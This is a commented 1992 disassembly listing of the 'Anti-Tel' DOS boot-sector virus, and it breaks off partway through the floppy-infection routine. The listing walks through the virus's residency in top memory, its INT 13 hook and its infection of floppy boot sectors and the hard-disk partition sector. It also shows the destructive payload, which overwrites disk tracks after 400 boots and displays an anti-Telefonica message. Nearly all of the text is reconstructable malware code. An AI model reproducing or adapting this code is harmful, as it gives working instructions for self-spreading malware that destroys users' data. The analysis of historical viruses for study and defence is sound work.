   anti-tel.lst                                     Sourcer Listing v1.88    28-Mar-92   5:21 pm   Page 1

Variables:
        [0003..001E]    = Reserved area for Boot Sector Information 3.00+
        [0070..008B]    = Array [1..7] Of
                Size_Free       STRUC
                        Size    DW
                        Sector  DB
                        Head    DB
                Size_Free       ENDS

                Offset; Size  ; Size  ; Sector; Head
                      ; Hex   ; Dec   ; Hex   ; Hex
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                0     ; 0140  ; 160K  ; 06    ; 00
                4     ; 0168  ; 180K  ; 08    ; 00
                8     ; 0280  ; 320K  ; 01    ; 01
                C     ; 02D0  ; 360K  ; 02    ; 01
                10    ; 0960  ; 1.2M  ; 0D    ; 01
                14    ; 05A0  ; 720K  ; 04    ; 01
                18    ; 0B40  ; 1.44M ; 0E    ; 01
                1C    ; FFFF  ; HD    ; 06    ; 00

        [00AE] DWrod= Original INT 13 Pointer
        [00E7] Word = Tracks per Side on this Disk
        [00E9] Byte = Sectors per Track on this Disk
        [00EA] Byte = Total Heads on this Disk
        [00EB] Byte = Some kind of Counter
        [00EC] Byte = Offset from CS:0070 to Booted Disk Size
        [00ED] Byte = Booted Drive Stored in duplication procces
        [01AF] Byte = (Resident) Drive (DL) on entry to INT 13
        [01BE..0200]    = Reserved are for Partition Table Information
        [02EC] Word = Boots Counter

8AE2:0000  EB 1C                                jmp     short loc_1             ; (001E)
8AE2:0002  90                                   nop
8AE2:0003                                       1Ch     dup     (00)            ; Reserved area for Boot Sector Info 3.00+

8AE2:001E  BB 7C00                              mov     bx,7c00h                ; BX=7C00       ; Start Up Boot Segment
8AE2:0021  33 C0                                xor     ax,ax                   ; AX=0000
8AE2:0023  FA                   cli             ; Disable interrupts
8AE2:0024  8E D0                                mov     ss,ax                   ; SS=0000
8AE2:0026  8B E3                                mov     sp,bx                   ; SP=7C00       ; Stack=0000:7C00
8AE2:0028  FB                   sti             ; Enable interrupts
8AE2:0029  8E D8                                mov     ds,ax                   ; DS=0000
8AE2:002B  A1 0413                              mov     ax,word ptr ds:[413h]   ; Memory Size KB
8AE2:002E  48                                   dec     ax                      ; AX--
8AE2:002F  A3 0413                              mov     word ptr ds:[413h],ax   ; Decrement Memory Size in 1 KB
8AE2:0032  B1 06                                mov     cl,6                    ;
8AE2:0034  D3 E0                                shl     ax,cl                   ; AX=Last Segment
8AE2:0036  8E C0                                mov     es,ax                   ; ES=Last Segment
8AE2:0038  B9 0200                              mov     cx,200h                 ; CX=0200
8AE2:003B  0E                                   push    cs                      ;
8AE2:003C  1F                                   pop     ds                      ; DS=0000 (CS)
8AE2:003D  8B F3                                mov     si,bx                   ; SI=7C00
8AE2:003F  33 FF                                xor     di,di                   ; DI=0000
8AE2:0041  FC                   cld             ; Clear direction
8AE2:0042  F3/A4                                rep     movsb                   ; Moves him self to Last Mem Segment
8AE2:0044  06                                   push    es                      ; ES=Last Segment
8AE2:0045  BB 00EE                              mov     bx,0EEh                 ; BX=00EE
8AE2:0048  53                                   push    bx
8AE2:0049  CB                                   retf                            ; Return far To Last Segment:00EE
                                                                                ; See 8AE2:00EE 

8AE2:004A  BC 9E 92 8F 9E 5B 9E DF BE 91 8B 96  db -'Campa;a Anti'              ;
8AE2:0056  D2 AB BA B3 BA B9 B0 B1 B6 BC BE DF  db -'-TelefonICA '              ; 1's complement of each character
8AE2:0062  D7 BD 9E 8D 9C 9A 93 90 91 9E D6 F2  db -'(Barcelona)',-0dh          ; on de message
8AE2:006E  F5 FF                                db -0a,-0

8AE2:0070  40 01 FF 40 01 06 00 68 01 00 68 01                                  ;
8AE2:0076  08 00 80 02 01 01 D0 02 02 01 60 09                                  ; List of Disk Size, Free Sector, Free Head
8AE2:007F  01 60 09 0D 01 A0 05 04 01 40 0B 0E                                  ; For differen disk types.
8AE2:007B  01                                                                   ;

8AE2:008C  FF                                   db ff                           ;
8AE2:008D  FF 06 00 F4                          inc     word ptr ds:[0F400h]    ; (8AE2:F400=0)
8AE2:0091  02 02                add al,[bp+si]
8AE2:0093  01

                                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                ;                  SUBROUTINE
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
                                sub_1           proc    near (*)
8AE2:0094  B8 0301                              mov     ax,0301                 ;
8AE2:0097  CD 13                                int     13h                     ; Disk  dl=drive  ah=func 03h
                                                                                ;  write sectors from mem es:bx
8AE2:0099  C3                                   retn
  
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                ;                  SUBROUTINE
                                ;               Try 4 times to read an absolute sector
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
                                sub_2           proc    near (*)
8AE2:009A  BD 0004                              mov     bp,4                    ; BP=0004
8AE2:009D                       loc_2:                                          ; Here if Error And not 4 Times Readed
8AE2:009D  B8 0201                              mov     ax,201h                 ;
8AE2:00A0  CD 13                int 13h         ; Disk  dl=drive o: ah=func 02h
                                        ;  read sectors to memory es:bx
8AE2:00A2  73 07                jnc loc_ret_3       ; Jump if carry=0
8AE2:00A4  32 E4                                xor     ah,ah                   ; Zero register
8AE2:00A6  CD 13                int 13h         ; Disk  dl=drive o: ah=func 00h
                                        ;  reset disk, al=return status
8AE2:00A8  4D                   dec bp
8AE2:00A9  75 F2                jnz loc_2           ; Jump if not zero
8AE2:00AB                       loc_ret_3:                                      ; Here if wants to return
8AE2:00AB  C3                   retn
                sub_2       endp

                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                ;                  SUBROUTINE
                                ;                       Executes an original INT 13
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                                                                                  
                                sub_2_1         proc    near (*)
8AE2:00AC  9C                                   pushf                           ; Push flags
8AE2:00AD  9A F000:A1E3             call    far ptr sub_6       ;*(F000:A1E3)
8AE2:00B2  C3                   retn
                                sub_2_1         endp
  
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                ;                  SUBROUTINE
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                                                                                  
                                sub_3           proc    near (*)
8AE2:00B3  8A 0E 00EC                           mov     cl,byte ptr ds:[00ECh]  ; CL=Offset From CS:0070 To Current Disk Size
8AE2:00B7  BE 0070                              mov     si,70h                  ; SI=0070
8AE2:00BA  03 F1                                add     si,cx                   ; SI+=CX
8AE2:00BC  8A 4C 02             ;*              mov     cl,byte ptr ds:[2][si]  ; CL=Free Sector
8AE2:00BC  8A 4C 02                             db      8Ah, 4Ch, 2             ; Fixup for MASM (Z)
8AE2:00BF  8A 74 03             ;*              mov     dh,byte ptr ds:[3][si]  ; DH=Free Head
8AE2:00BF  8A 74 03                             db      8Ah, 74h, 3             ; Fixup for MASM (Z)
8AE2:00C2  C3                   retn
                sub_3       endp
  
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                ;                  SUBROUTINE
                                ;          Writes all the sectors of a track for Head in DH
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
                                sub_4           proc    near (*)
8AE2:00C3  A0 00E9                              mov     al,data_33              ; AL=Sectors per Track
8AE2:00C6  B4 03                                mov     ah,3                    ; AH=03
8AE2:00C8  CD 13                                int     13h                     ; Disk  dl=drive a: ah=func 03h
                                                                                ;  write sectors from mem es:bx
8AE2:00CA  FE C6                                inc     dh                      ; DH++ (Increment Head #)
8AE2:00CC  C3                   retn
                sub_4       endp

                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                ;                  SUBROUTINE
                                ;     Transforms a Track # in CX to an INT 13 Track # Type in CH/CL
                                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
                                sub_5           proc    near (*)
8AE2:00CD  52                                   push    dx                      ;
8AE2:00CE  8B D1                                mov     dx,cx                   ; DX=CX
8AE2:00D0  86 F2                                xchg    dh,dl                   ; DH=CL & DL=CH
8AE2:00D2  B1 06                                mov     cl,6                    ;
8AE2:00D4  D2 E2                                shl     dl,cl                   ; 2 MSB of DL=2 LSB of CH
8AE2:00D6  80 CA 01                             or      dl,1                    ; LSB of DL=1
8AE2:00D9  8B CA                                mov     cx,dx                   ; CX=Transformed Track # to INT 13 Format
8AE2:00DB  5A                                   pop     dx                      ; Restores DX
8AE2:00DC  C3                   retn
                                sub_5           endp

                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                ;                  SUBROUTINE
                                ;
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
                                sub_6           proc    near (*)
8AE2:00DD                       loc_4:                                          ; Here if Tracks!=Total Tracks
8AE2:00DD  E8 FFE3                              call    sub_4                   ; (00C3) Write all sectors of a track. DH++
8AE2:00E0  3A 36 00EA                           cmp     dh,data_34              ;
8AE2:00E4  75 F7                                jne     loc_4                   ; DH!=Total Heads on Disk ?  Loop until so
8AE2:00E6  C3                                   retn
                                sub_6           endp

8AE2:00E7  0050                 data_32         dw      50h                     ; 80 Tracks
8AE2:00E9  0F                   data_33         db      0Fh                     ; 15 Sectors
8AE2:00EA  02                   data_34         db      2                       ; 2 Sides
8AE2:00EB  02
8AE2:00EC  10                                   db      10h                     ; Offset from CS:0070 to disk type = 10
8AE2:00ED  00           data_36     db  0
                                        ; Upper Segment Boot-Up Entry Point

8AE2:00EE  8E D8                                mov     ds,ax                   ; DS=Last Segment
8AE2:00F0  32 E4                                xor     ah,ah                   ; AH=00
8AE2:00F2  CD 13                                int     13h                     ; Disk  dl=drive ;: ah=func 00h
                                                                                ;  reset disk, al=return status
8AE2:00F4  BB 0200                              mov     bx,200h                 ; BX=0200
8AE2:00F7  8A EB                                mov     ch,bl                   ; CH=00
8AE2:00F9  8A 16 00ED                           mov     dl,byte ptr ds:[0EDh]   ; DL=Booted Drive
8AE2:00FD  E8 FFB3                              call    sub_3                   ; (00B3) CL=Sector (0D), DH=Head (01)
8AE2:0100  E8 FF97                              call    sub_2                   ; (00A9) Read Sector
8AE2:0103  FF 06 02EC                           inc     word ptr ds:[2ECh]      ; Increments Boots Counter
8AE2:0107  81 3E 02EC 0190                      cmp     word ptr ds:[2ECh],190h ; Compares Boot Counter With 400
8AE2:010D  76 03                                jbe     loc_5                   ; Counter<=400 ? 
8AE2:010F  E9 010F                              jmp     loc_11                  ; Cuont>400 ?  (0221)
8AE2:0112                       loc_5:                                          ; Here if counter <=400
8AE2:0112  E8 FF7F                              call    sub_1                   ; (0094) Write 1 sector
                                                                                ; Writes Actualiced Boot Counter
8AE2:0115  33 C0                                xor     ax,ax                   ; AX=0000
8AE2:0117  A3 02EC                              mov     word ptr ds:[2ECh],ax   ; Zero Boot Counter
8AE2:011A  8E C0                                mov     es,ax                   ; ES=0000
8AE2:011C  BB 7C00                              mov     bx,7C00h                ; BX=7C00
8AE2:011F  FE C1                                inc     cl                      ; CL++          ; Point to next sector
8AE2:0121  E8 FF76                              call    sub_2                   ; (009A) Read Sector
8AE2:0124  80 FA 80                             cmp     dl,80h                  ; 
8AE2:0127  75 03                                jne     loc_6                   ; Didn't it Boot from a Hard Disk ?  This Line
8AE2:0129  E9 0081                              jmp     loc_9                   ; If Booted from a hard disk  (01AD)
8AE2:012C                       loc_6:                                          ; Here if didn't boot from a Hard Disk
8AE2:012C  8C CB                                mov     bx,cs                   ; BX=Last Segmnet
8AE2:012E  81 EB 1000                           sub     bx,1000h                ; BX-=4K
8AE2:0132  8E C3                                mov     es,bx                   ; ES=Last Segment-4K
8AE2:0134  33 DB                                xor     bx,bx                   ; BX=0000
8AE2:0136  B1 01                                mov     cl,1                    ; CL=01
8AE2:0138  BA 0080                              mov     dx,80h                  ; DX=0080
8AE2:013B  E8 FF5C                              call    sub_2                   ; (009A) Read Hard Disk's Part
8AE2:013E  72 6D                                jc      loc_9                   ; If Error Dosn't infect Hard Disk
8AE2:0140  26:81 BF 004A 9EBC                   cmp  word ptr es:[4Ah][bx],9EBCh; Looks Word at Offset 004A Of Part,
8AE2:0147  74 64                                je      loc_9                   ; If 9EBC is there, it's already infected 
8AE2:0149  51                                   push    cx                      ; CX=0001 (Part Sector)
8AE2:014A  52                                   push    dx                      ; DX=0080 (Hard Disk)
8AE2:014B  B4 08                                mov     ah,8                    ; AH=08
8AE2:014D  CD 13                                int     13h                     ; Disk  dl=drive c: ah=func 08h
                                                                                ;  read parameters for drive dl
8AE2:014F  72 20                                jc      loc_7                   ; Error ? 
8AE2:0151  FE C6                                inc     dh                      ; DH=Last Head
8AE2:0153  88 36 00EA                           mov     byte ptr ds:[0EAh],dh   ; [00EA]=Last Head
8AE2:0157  8A D1                                mov     dl,cl                   ; DL=Last Sector
8AE2:0159  86 E9                                xchg    ch,cl                   ; CH=Last Sector; CL=Cylinders
8AE2:015B  80 E5 3F                             and     ch,3Fh                  ; CH&=00111111
8AE2:015E  88 2E 00E9                           mov     byte ptr ds:[0E9h],ch   ; [00E9] = Last Sector
8AE2:0162  51                                   push    cx                      ; CX=Sectors/Tracks
8AE2:0163  B1 06                                mov     cl,6                    ;
8AE2:0165  D2 EA                                shr     dl,cl                   ; DL=MSB of Last Track on LSB of DL
8AE2:0167  59                                   pop     cx                      ; CX=Sectors/Tracks
8AE2:0168  8A EA                                mov     ch,dl                   ; CH=MSB of Last Disk Track
8AE2:016A  41                                   inc     cx                      ; CX++
8AE2:016B  89 0E 00E7                           mov     word ptr ds:[0E7h],cx   ; [00E7]=Last Track
8AE2:016F  EB 10                                jmp     short loc_8             ;  (0181)
8AE2:0171                       loc_7:                                          ; Here if error while reading Dirve Params
8AE2:0171  C6 06 00EA 04                        mov     byte ptr ds:[0EAh],4    ; Last Head=4
8AE2:0176  C6 06 00E9 11                        mov     byte ptr ds:[0E9h],11h  ; Last Sector=17
8AE2:017B  C7 06 00E7 0263                      mov     word ptr ds:[0E7h],263h ; Last Cylinder=611
8AE2:0181                       loc_8:                                          ; Here directly if no error reading Params
8AE2:0181  5A                                   pop     dx                      ; DX=Hard Disk
8AE2:0182  59                                   pop     cx                      ; CX=Part Sector
8AE2:0183  C6 06 00EC 1C                        mov     byte ptr ds:[0ECh],1Ch  ; [00EC]=1C
8AE2:0188  88 16 00ED                           mov     byte ptr ds:[0EDh],dl   ; Booted drive=C:
8AE2:018C  B1 07                                mov     cl,7                    ; CL=07
8AE2:018E  E8 FF03                              call    sub_1                   ; (0094) Write Old Part to Sector 07
8AE2:0191  06                                   push    es                      ;
8AE2:0192  1F                                   pop     ds                      ; DS=Last Segment-4K
8AE2:0193  0E                                   push    cs                      ;
8AE2:0194  07                                   pop     es                      ; ES=Last Segment
8AE2:0195  B9 0042                              mov     cx,42h                  ; CX=0042 (Size of Partition Info in Part)
8AE2:0198  BE 01BE                              mov     si,1BEh                 ; SI=01BE (Offset of Partition Info in Part)
8AE2:019B  8B FE                                mov     di,si                   ; DI=01BE
8AE2:019D  FC                                   cld                             ; Clear direction
8AE2:019E  F3/A4                                rep     movsb                   ; Copy Partiotion Info to Anti-Tel Part Sector
8AE2:01A0  FE C1                                inc     cl                      ; CX=0001
8AE2:01A2  E8 FEEF                              call    sub_1                   ; (0094) Write Anti-Tel Part To Hard Disk Part
8AE2:01A5  BB 0200                              mov     bx,200h                 ; BX=0200
8AE2:01A8  B1 06                                mov     cl,6                    ; CL=06
8AE2:01AA  E8 FEE7                              call    sub_1                   ; (0094) Write Anti-Tal Cont To Hard Sector 06
8AE2:01AD                       loc_9:                                          ; Continues here if booted from Hard, or error
                                                                                ; or Hard already infected.
8AE2:01AD  EB 51                                jmp     short loc_49            ;*(0200) Set INT 13 ;r
8AE2:01AF  00
                                loc_9_2:                                        ; Here to exit Residet INT 13
8AE2:01B0  1F                                   pop     ds                      ;
8AE2:01B1  5E                                   pop     si                      ;
8AE2:01B2  2E:FF 2E 00AE                        jmp     dword ptr cs:[0AEh]     ; Go on with old INT 13
                                loc_9_1:                                        ; Here to jump to AX:7C00
8AE2:01B7  50                                   push    ax                      ;
8AE2:01B8  BB 7C00                              mov     bx,7C00h                ;
8AE2:01BB  53                                   push    bx                      ; Return far to 0000:7C00
8AE2:01BC  CB                                   retf                            ; Executes previous loaded original Boot)

8AE2:01BD  AD                                   lodsw                           ; String [si] to ax
8AE2:01BE  80 01 01                             add     byte ptr [bx+di],1
8AE2:01C1  00 01                add [bx+di],al
8AE2:01C3  06                   push    es
8AE2:01C4  11 33                adc [bp+di],si
8AE2:01C6  11 00                adc [bx+si],ax
8AE2:01C8  00 00                add [bx+si],al
8AE2:01CA  1B 18                sbb bx,[bx+si]
8AE2:01CC  00 00                add [bx+si],al
8AE2:01CE  00 00                add [bx+si],al
8AE2:01D0  01 34                add [si],si
8AE2:01D2  05 9106              add ax,9106h
8AE2:01D5  DB                   esc 3,[si]
8AE2:01D6  2C 18                sub al,18h
8AE2:01D8  00 00                add [bx+si],al
8AE2:01DA  18 3C                sbb [si],bh
8AE2:01DC  01 00                                add     [bx+si],ax
8AE2:01DE  0020[00]             db  32 dup (0)
8AE2:01FE  55                   push    bp
8AE2:01FF  AA                   stosb               ; Store al to es:[di]
8AE2:0200                       loc_49:                                         ; Here after bootup prccess
8AE2:0200  33 C0                                xor     ax,ax                   ; AX=0000
8AE2:0202  2E:A2 00ED                           mov     byte ptr cs:[00EDh],al  ; Set Booted Drive = A:
8AE2:0206  8E D8                                mov     ds,ax                   ; DS=0000
8AE2:0208  BB 029F                              mov     bx,29Fh                 ; BX=0297
8AE2:020B  8C CA                                mov     dx,cs                   ; DX=Last Segment (CS)
8AE2:020D  87 1E 004C                           xchg    bx,word ptr ds:[4Ch]    ; 4C=13*4       ; Sets INT 13 ;r to CS:0297
8AE2:0211  87 16 004E                           xchg    dx,word ptr ds:[4Eh]    ; 4E=13*4+2     ; Gets INT 13 ;r to DX:BX
8AE2:0215  0E                                   push    cs                      ;
8AE2:0216  1F                                   pop     ds                      ; DS=CS
8AE2:0217  87 1E 00AE                           xchg    bx,word ptr ds:[0AEh]   ;
8AE2:021B  87 16 00B0                           xchg    dx,word ptr ds:[0B0h]   ; Saves INT 13 ;r to CS:[00AE]
8AE2:021F  EB 96                                jmp     short loc_9_1           ; (01B7) 

8AE2:0221                       loc_11:                                         ; Here if boot counter>400
8AE2:0221  33 C0                                xor     ax,ax                   ; AX=0000
8AE2:0223  A3 02EC                              mov     word ptr ds:[2ECh],ax   ; [02EC]=0000 (Reset boot counter) 
8AE2:0226  E8 FE6B                              call    sub_1                   ; (0094) Write updated sector           
8AE2:0229  0E                                   push    cs                      ;                                       
8AE2:022A  1F                                   pop     ds                      ; DS=Anti-Tel Segment (CS) (Ridiculo ya es asi)
8AE2:022B  8A 16 00ED                           mov     dl,byte ptr ds:[0EDh]   ; DL=Booted drive
8AE2:022F                       loc_15:                                         ; Here at entry to INT 13, if DS:[00EB] = 1
                                                                                ; or boot counter>400
8AE2:022F  33 C0                                xor     ax,ax                   ; AX=0000
8AE2:0231  8E C0                                mov     es,ax                   ; ES=0000       ;
8AE2:0233  8B D8                                mov     bx,ax                   ; BX=0000       ; ES:BX => Interrupt Vectors
8AE2:0235  8B 0E 00E7                           mov     cx,word ptr ds:[0E7h]   ; CX=Tracks per Side
8AE2:0239  49                                   dec     cx                      ; CX--
8AE2:023A  E8 FE90                              call    sub_5                   ; (00CD) Transforms CX into an INT 13 Track #
8AE2:023D  32 F6                                xor     dh,dh                   ; DH=00
8AE2:023F  E8 FE9B                              call    sub_6                   ; (00DD) Write all sector, all heads, one track
                                                                                ;        deletes the last track of the disk
8AE2:0242  B9 0001                              mov     cx,1                    ; CX=0001       ; Track 00, Sector 01
8AE2:0245  8A F1                                mov     dh,cl                   ; DH=01
8AE2:0247  E8 FE93                              call    sub_6                   ; (00DD) Write a Track, Deletes the first track
8AE2:024A                       loc_16:                                         ; Here after loop, if track < 6
8AE2:024A  51                                   push    cx                      ; CX=0001
8AE2:024B  E8 FE7F                              call    sub_5                   ; (00CD) Transforms CX into an INT 13 Track #
8AE2:024E  32 F6                                xor     dh,dh                   ; DH=00
8AE2:0250  E8 FE8A                              call    sub_6                   ; (00DD) Deletes tracka #1-#6 (DIR - FAT)
8AE2:0253  59                                   pop     cx                      ; CX=0001
8AE2:0254  FE C1                                inc     cl                      ; CL++
8AE2:0256  80 F9 06                             cmp     cl,6                    ;
8AE2:0259  75 EF                                jne     loc_16                  ; CL!=06 ?  Deletes tracks from 1 to 5
8AE2:025B  8A 0E 00EA                           mov     cl,byte ptr ds:[0EAh]   ; CL=Total Heads on Disk
8AE2:025F  8B F9                                mov     di,cx                   ; DI=Total Heads on Disk
8AE2:0261                       loc_17:                                         ; Loops here for deleting all heads
8AE2:0261  B9 0006                              mov     cx,6                    ; CX=0006
8AE2:0264  8A F3                                mov     dh,bl                   ; DH=BL=00++
8AE2:0266                       loc_18:                                         ; Loop Here for deleting All tracks
8AE2:0266  51                                   push    cx                      ; CX=0006
8AE2:0267  E8 FE63                              call    sub_5                   ; (00CD) Transforms CX into an INT 13 Track #
8AE2:026A  E8 FE56                              call    sub_4                   ; (00C3)Write all Sectors Of Track,DL=Head,DH++
8AE2:026D  3A 36 00EA                           cmp     dh,byte ptr ds:[0EAh]   ;
8AE2:0271  75 02                                jne     loc_19                  ; Head(DH)!=Total Heads ?  (0275)
8AE2:0273  32 F6                                xor     dh,dh                   ; DH=00, Head=0
8AE2:0275                       loc_19:
8AE2:0275  59                                   pop     cx                      ; CX=Writed Track
8AE2:0276  41                                   inc     cx                      ; CX++
8AE2:0277  3B 0E 00E7                           cmp     cx,word ptr ds:[0E7h]   ;
8AE2:027B  75 E9                                jne     loc_18                  ; Track(CX)!=Tracks per Side 
8AE2:027D  FE C3                                inc     bl                      ; BL++
8AE2:027F  BE 004A                              mov     si,4Ah                  ; SI=4A
8AE2:0282  FC                                   cld                             ;
8AE2:0283                       loc_20:
8AE2:0283  AC                                   lodsb                           ; DS=CS AL=CS:[SI (4A++) ]
8AE2:0284  F6 D0                                not     al                      ; Loads AL With Encrypted Message Letter
8AE2:0286  0A C0                                or      al,al                   ; 'Campa;a Anti-TelefonICA (Barcelona)',0dh,0ah
8AE2:0288  74 08                                jz      loc_21                  ; 00 End of message.
8AE2:028A  B4 0E                                mov     ah,0Eh                  ; AH=0E
8AE2:028C  32 FF                                xor     bh,bh                   ; BH=00
8AE2:028E  CD 10                                int     10h                     ; Video display   ah=functn 0Eh
                                                                                ;  write char al, teletype mode
8AE2:0290  EB F1                                jmp     short loc_20            ; (0283) Loop until all message shown
8AE2:0292                       loc_21:
8AE2:0292  4F                                   dec     di                      ; DI--
8AE2:0293  75 CC                                jnz     loc_17                  ; DI!=0 ?  (0261)
8AE2:0295  FE C2                                inc     dl                      ; DL=01

                                        ; External INT 13 Entry Point

8AE2:0297  FE 0E 00EB                           dec     byte ptr ds:[0EBh]      ; DS:[00EB]--
8AE2:029B  75 92                                jnz     loc_15                  ; DS:[00EB]!=0 ?  (022F)
8AE2:029D  FA                                   cli                             ;
8AE2:029E  F4                                   hlt                             ; Waits a NMI or a Reset ??????
8AE2:029F  56                                   push    si                      ; Caller's SI
8AE2:02A0  1E                                   push    ds                      ; Caller's DS
8AE2:02A1  80 FA 80                             cmp     dl,80h                  ;
8AE2:02A4  75 03                                jne     loc_22                  ; DL!=80 (Drive!=C:) ?  (02A9)
8AE2:02A6  E9 0112                              jmp     loc_31                  ; If Drive = C:  (03BB)
8AE2:02A9                       loc_22:
8AE2:02A9  80 FC 02                             cmp     ah,2                    ;
8AE2:02AC  72 3B                                jb      loc_24                  ; Below Read Operation ?  (02E9) Return
8AE2:02AE  80 FC 03                             cmp     ah,3                    ;
8AE2:02B1  77 36                                ja      loc_24                  ; Above Write Operation ?  (02E9) Return
8AE2:02B3  80 FA 02                             cmp     dl,2                    ;
8AE2:02B6  73 31                                jae     loc_24                  ; Drive!=A:!=B: ?  (02E9) Return Pop DI,SI Ret
                                                                                ; Here only if Read or Write On A: or B:
8AE2:02B8  33 F6                                xor     si,si                   ; SI=0000
8AE2:02BA  8E DE                                mov     ds,si                   ; DS=0000
8AE2:02BC  F6 06 043F 03                        test    byte ptr ds:[43Fh],3    ; [0040:003F] = Motor Status
8AE2:02C1  75 26                                jnz     loc_24                  ; Are A: or B: Motors ON ?  (02E9) Return
8AE2:02C3  50                                   push    ax                      ; Caller's AX   ; Here if Motors Was Off
8AE2:02C4  51                                   push    cx                      ; Caller's CX
8AE2:02C5  52                                   push    dx                      ; Caller's DX
8AE2:02C6  0E                                   push    cs                      ;
8AE2:02C7  1F                                   pop     ds                      ; DS=CS
8AE2:02C8  88 16 01AF                           mov     byte ptr ds:[1AFh],dl   ;
8AE2:02CC  55                                   push    bp                      ; Caller's BP
8AE2:02CD  BD 0004                              mov     bp,4                    ; BP=0004
8AE2:02D0                       loc_23:                                         ; Loops here if Error loading boot
8AE2:02D0  B8 0201                              mov     ax,201h                 ; AX=0201
8AE2:02D3  32 F6                                xor     dh,dh                   ; DH=0000
8AE2:02D5  B9 0001                              mov     cx,1                    ; CX=0001
8AE2:02D8  E8 FDD1                              call    sub_2_1                 ; (00AC) INT 13 (Read A:"Boot", Overwrites)
8AE2:02DB  73 11                                jnc     loc_25                  ; No Error ?  (02EE)
8AE2:02DD  33 C0                                xor     ax,ax                   ; AX=0000
8AE2:02DF  E8 FDCA                              call    sub_2_1                 ; (00AC) INT 13 (Reset Disk)
8AE2:02E2  4D                                   dec     bp                      ; BP--
8AE2:02E3  75 EB                                jnz     loc_23                  ; Try to load Boot 4 times
8AE2:02E5  5D                                   pop     bp                      ; Caller's BP
8AE2:02E6  5A                                   pop     dx                      ; Caller's DX
8AE2:02E7  59                                   pop     cx                      ; Caller's CX
8AE2:02E8  58                                   pop     ax                      ; Caller's AX
8AE2:02E9                       loc_24:                                         ; Here if Drive!=A:!=B: or Motors ON or Error
8AE2:02E9  E9 FEC4                              jmp     loc_9_2                 ; (01B0) Go on Pops DS,SI Jump Old INT 13
8AE2:02EC  0000                 data_15         dw      0
8AE2:02EE                       loc_25:                                         ; Here if could load A:Boot
8AE2:02EE  5D                                   pop     bp                      ; Caller's BP
8AE2:02EF  26:81 BF 004A 9EBC                   cmp   word ptr es:[bx+4Ah],9EBCh; Looks Word at Offset 004A Of Boot,
8AE2:02F6  75 03                                jne     loc_26                  ; If 9EBC isn't there, it's not infected 
8AE2:02F8  E9 00A1                              jmp     loc_30                  ; (039C)
8AE2:02FB                       loc_26:                                         ; Here if not infected
8AE2:02FB  26:8B 87 0013                        mov     ax,es:[bx+13h]          ; AX=Number of total sectors
8AE2:0300  BE 0070                              mov     si,70h                  ; SI=0070
8AE2:0303                       loc_27:
8AE2:0303  39 04                                cmp     [si],ax                 ; 0140,0168,0280,02D0,0960 ,05A0,0b40
                                                                                ; 160K,180K,320K,360K,1200K,720K,1440K
8AE2:0305  74 05                                je      loc_28                  ; Match  ? 
8AE2:0307  83 C6 04                             add     si,4                    ; SI+=4
8AE2:030A  EB F7                                jmp     short loc_27            ; (0303) Until Match
8AE2:030C                       loc_28:                                         ; Here if [SI] Match Disk Size
8AE2:030C  53                                   push    bx                      ; Caller's BX
8AE2:030D  8B DE                                mov     bx,si                   ; BX=Pointer to Matched Disk Size
8AE2:030F  BA 0070                              mov     dx,70h                  ; DX=0070
8AE2:0312  2B DA                                sub     bx,dx                   ; BX-=70
8AE2:0314  8A D3                                mov     dl,bl                   ; DX=Offset From 70 to Matched Disk Size
8AE2:0316  5B                                   pop     bx                      ; Caller's BX
8AE2:0317  88 16 00EC                           mov     byte ptr ds:[0ECh],dl   ; [00EC]=Offset from CS:0070 to Matched Size
8AE2:031B  8A 4C 02                             mov     cl,[si+2]               ; CL=Free Sector
8AE2:031E  FE C1                                inc     cl                      ; CL++
8AE2:0320  8A 74 03                             mov     dh,[si+3]               ; DH=Free Head
8AE2:0323  8A 16 01AF                           mov     dl,byte ptr ds:[1AFh]   ; Restores DL
8AE2:0327  B8 0301                              mov     ax,301h                 ; AX=0301
8AE2:032A  E8 FD7F                              call    sub_2_1                 ; (00AC) INT 13 Write Old Boot To A Free Sector
8AE2:032D  51                                   push    cx                      ; CX=Free Track\Sector
8AE2:032E  26:8B 87 0018                        mov     ax,es:[bx+18h]          ; AX=Sectors Per Track
8AE2:0333  A2 00E9                              mov     byte ptr ds:[0E9h],al   ; [00E9]=Sectors per Track
8AE2:0336  8A E8                                mov     ch,al                   ; CH=Sectors per Track
8AE2:0338  26:8B 87 001A                        mov     ax,es:[bx+1Ah]          ; AX=Number of Heads
8AE2:033D  A2 00EA                              mov     byte ptr ds:[0EAh],al   ; [00EA]=Total Heads
